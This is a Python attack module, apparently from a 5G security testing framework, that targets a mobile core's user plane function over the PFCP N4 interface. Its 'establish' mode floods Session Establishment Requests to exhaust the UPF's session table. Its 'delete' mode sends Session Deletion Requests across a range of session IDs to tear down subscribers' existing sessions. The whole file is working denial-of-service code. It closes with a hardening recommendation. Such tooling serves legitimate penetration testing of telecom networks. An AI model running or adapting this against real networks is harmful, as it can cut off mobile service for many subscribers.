#!/usr/bin/env python3
'''
PFCP Session DoS (5G N4 interface).

If a UPF accepts PFCP from an attacker (no N4 isolation / no IPsec), the control
plane can be abused for denial of service:

  * "establish" mode  - flood Session Establishment Requests to exhaust the UPF's
                        session table / resources.
  * "delete"    mode  - send Session Deletion Requests for a range of SEIDs to
                        tear down existing subscriber sessions.

The mode, target SEID and repeat count come from the config's ``[SESSION]``
section.

    main(config_file, target, listening, verbosity, output_file)
'''
from fiveg.pfcp_core.pfcp_config_parser import PfcpConfig
from fiveg.pfcp_core.pfcp_transport import send, probe
from fiveg.pfcp_core.session_messages.session_establishment import SessionEstablishmentRequest
from fiveg.pfcp_core.session_messages.session_deletion import SessionDeletionRequest
from fiveg.pfcp_core.commons import pfcp_commons as C
from fiveg.commons.utilities import logOk, logErr, logWarn, logInfo, logNormal

TAG = 'PFCP-SESSION-DoS'


def main(config_file, target, listening=True, verbosity=2, output_file=None,
         mode='establish'):
    if not target:
        logErr('No target set. Use "set target <upf-ip>".', TAG=TAG)
        return
    if not config_file:
        logErr('Set a config file ("set config <file>") with the [SESSION] params.',
               TAG=TAG)
        return
    try:
        cfg = PfcpConfig(config_file)
    except Exception as e:
        logErr('Bad config: %s' % e, TAG=TAG)
        return

    host = target
    port = cfg.port
    count = max(1, cfg.count)
    verbose = verbosity >= 2

    logWarn('N4 session %s flood: %d message(s) -> %s:%d'
            % (mode, count, host, port), TAG=TAG)

    sent = 0
    accepted = 0
    for i in range(count):
        seq = (cfg.sequence + i) & 0xffffff
        if mode == 'delete':
            msg = SessionDeletionRequest(seid=(cfg.seid + i), sequence=seq)
        else:
            msg = SessionEstablishmentRequest(
                cp_node_id=cfg.node_id, cp_seid=(cfg.cp_seid + i),
                cp_ipv4=cfg.cp_ipv4, ue_ipv4=cfg.ue_ipv4, sequence=seq,
                node_type=cfg.node_type)

        # For the first message wait for a reply (confirms the UPF is processing
        # our PFCP); the remainder are fire-and-forget for throughput.
        if i == 0:
            reply = probe(host, port, msg, timeout=cfg.timeout)
            sent += 1
            if reply is not None:
                cause = _cause(reply['ies'])
                logOk('UPF replied: %s (cause=%s)'
                      % (reply['msg_type_str'], cause), TAG=TAG)
                if cause == 'request-accepted':
                    accepted += 1
            else:
                logNormal('no reply to first %s message' % mode,
                          verbose=verbose, TAG=TAG)
        else:
            sent += send(host, port, msg.get_message())
            logNormal('sent %s #%d (seq=%d)' % (mode, i + 1, seq),
                      verbose=verbose, TAG=TAG)

    logInfo('Done: %d PFCP %s message(s) sent to %s:%d.'
            % (count, mode, host, port), TAG=TAG)
    logWarn('Recommendation: isolate N4, authenticate the SMF-UPF association '
            '(IPsec per TS 33.501), and rate-limit / validate PFCP so a peer '
            'cannot create or delete sessions at will.', TAG=TAG)
    return {'sent': count, 'accepted': accepted}


def _cause(ies):
    for ie_type, val in ies:
        if ie_type == C.PFCP_IE['cause'] and len(val) >= 1:
            return C.PFCP_CAUSE_STR.get(val[0], str(val[0]))
    return None
